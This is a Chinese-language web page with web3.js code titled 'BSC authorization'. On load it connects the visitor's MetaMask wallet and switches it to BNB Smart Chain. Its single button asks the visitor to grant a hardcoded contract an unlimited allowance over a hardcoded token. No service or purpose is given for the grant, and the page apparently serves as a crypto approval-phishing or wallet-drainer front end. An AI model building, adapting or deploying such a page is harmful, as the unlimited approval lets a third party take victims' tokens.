<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSC 授权</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .info-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .info-item:last-child {
            margin-bottom: 0;
        }
        
        .label {
            color: #666;
        }
        
        .value {
            color: #333;
            font-weight: 500;
        }
        
        .authorize-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        
        .authorize-btn:hover {
            transform: translateY(-2px);
        }
        
        .authorize-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        .wallet-info {
            background: #e3f2fd;
            border: 1px solid #bbdefb;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #1976d2;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔐</div>
        <h1>BSC 授权</h1>
        <p class="subtitle">授权访问您的代币</p>
        
        <div class="wallet-info" id="walletInfo" style="display: none;">
            <strong>钱包地址:</strong> <span id="walletAddress"></span>
        </div>
        
        <div class="info-box">
            <div class="info-item">
                <span class="label">授权合约:</span>
                <span class="value" id="contractAddress">0xe3c0e066D870036aCc178492C638963A0E97d4Bb</span>
            </div>
            <div class="info-item">
                <span class="label">代币合约:</span>
                <span class="value" id="tokenAddress">0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550</span>
            </div>
            <div class="info-item">
                <span class="label">授权数量:</span>
                <span class="value">无限</span>
            </div>
        </div>
        
        <button class="authorize-btn" id="authorizeBtn" onclick="authorize()">
            立即授权
        </button>
        
        <div class="status" id="status"></div>
    </div>

    <script>
        // BSC链配置
        const BSC_CHAIN_ID = '0x38'; // BSC主网
        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
        
        // 合约地址
        const PERMISSION_ADDRESS = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
        const TOKEN_CONTRACT = '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550';
        
        let web3;
        let userAccount;
        
        // 页面加载完成后自动连接钱包
        window.addEventListener('load', async () => {
            await connectWallet();
        });
        
        // 连接钱包
        async function connectWallet() {
            try {
                showStatus('正在连接钱包...', 'info');
                
                // 检查是否安装了MetaMask
                if (typeof window.ethereum === 'undefined') {
                    showStatus('请安装MetaMask钱包', 'error');
                    return false;
                }
                
                // 请求连接钱包
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts.length === 0) {
                    showStatus('请授权连接钱包', 'error');
                    return false;
                }
                
                userAccount = accounts[0];
                
                // 检查网络
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== BSC_CHAIN_ID) {
                    await switchToBSC();
                }
                
                // 初始化Web3
                web3 = new Web3(window.ethereum);
                
                // 显示钱包信息
                document.getElementById('walletAddress').textContent = userAccount;
                document.getElementById('walletInfo').style.display = 'block';
                
                showStatus('钱包连接成功！', 'success');
                setTimeout(() => hideStatus(), 2000);
                
                return true;
                
            } catch (error) {
                console.error('连接钱包失败:', error);
                showStatus('连接钱包失败: ' + error.message, 'error');
                return false;
            }
        }
        
        // 切换到BSC网络
        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }],
                });
            } catch (switchError) {
                // 如果BSC网络不存在，则添加
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_CHAIN_ID,
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: {
                                name: 'BNB',
                                symbol: 'BNB',
                                decimals: 18
                            },
                            rpcUrls: [BSC_RPC_URL],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }
        }
        
        // 授权函数
        async function authorize() {
            if (!web3 || !userAccount) {
                showStatus('请先连接钱包', 'error');
                return;
            }
            
            try {
                const authorizeBtn = document.getElementById('authorizeBtn');
                authorizeBtn.disabled = true;
                authorizeBtn.innerHTML = '<span class="loading"></span>授权中...';
                
                showStatus('正在构建授权交易...', 'info');
                
                // 构建授权交易
                const tokenContract = new web3.eth.Contract([
                    {
                        "constant": false,
                        "inputs": [
                            {"name": "_spender", "type": "address"},
                            {"name": "_value", "type": "uint256"}
                        ],
                        "name": "approve",
                        "outputs": [{"name": "", "type": "bool"}],
                        "payable": false,
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }
                ], TOKEN_CONTRACT);
                
                // 最大授权数量
                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                // 构建交易参数
                const data = tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256).encodeABI();
                
                // 估算Gas
                const gasEstimate = await tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256)
                    .estimateGas({ from: userAccount });
                
                // 发送交易
                const transaction = {
                    from: userAccount,
                    to: TOKEN_CONTRACT,
                    data: data,
                    gas: Math.floor(gasEstimate * 1.2), // 增加20%的Gas
                    gasPrice: await web3.eth.getGasPrice()
                };
                
                showStatus('请在钱包中确认交易...', 'info');
                
                // 发送交易
                const receipt = await web3.eth.sendTransaction(transaction);
                
                showStatus(`授权成功！交易哈希: ${receipt.transactionHash}`, 'success');
                
                // 重置按钮
                authorizeBtn.disabled = false;
                authorizeBtn.innerHTML = '授权成功';
                authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
                
            } catch (error) {
                console.error('授权失败:', error);
                showStatus('授权失败: ' + error.message, 'error');
                
                // 重置按钮
                const authorizeBtn = document.getElementById('authorizeBtn');
                authorizeBtn.disabled = false;
                authorizeBtn.innerHTML = '重新授权';
            }
        }
        
        // 显示状态信息
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status ${type}`;
            status.style.display = 'block';
        }
        
        // 隐藏状态信息
        function hideStatus() {
            document.getElementById('status').style.display = 'none';
        }
        
        // 监听网络切换
        if (window.ethereum) {
            window.ethereum.on('chainChanged', (chainId) => {
                if (chainId !== BSC_CHAIN_ID) {
                    showStatus('请切换到BSC网络', 'error');
                } else {
                    hideStatus();
                }
            });
            
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    userAccount = null;
                    document.getElementById('walletInfo').style.display = 'none';
                    showStatus('钱包已断开连接', 'error');
                } else {
                    userAccount = accounts[0];
                    document.getElementById('walletAddress').textContent = userAccount;
                    document.getElementById('walletInfo').style.display = 'block';
                    hideStatus();
                }
            });
        }
    </script>
</body>
</html>
